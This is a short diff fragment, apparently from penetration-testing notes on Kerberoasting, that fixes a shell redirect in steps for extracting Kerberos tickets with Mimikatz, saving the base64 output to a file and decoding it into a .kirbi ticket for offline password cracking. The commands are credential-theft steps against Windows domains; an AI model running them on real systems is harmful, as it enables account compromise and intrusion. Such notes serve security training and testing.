@@ -116,7 +116,7 @@ Extracting Tickets from Memory with Mimikatz , after requesting the tickets usin
 .\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"
 
 # Preparing the Base64 Blob for Cracking
-echo "<base64 blob>" |  tr -d \\n 
+echo "<base64 blob>" |  tr -d \\n  > encoded_file
 
 # Placing the Output into a File as .kirbi
 cat encoded_file | base64 -d > sqldev.kirbi
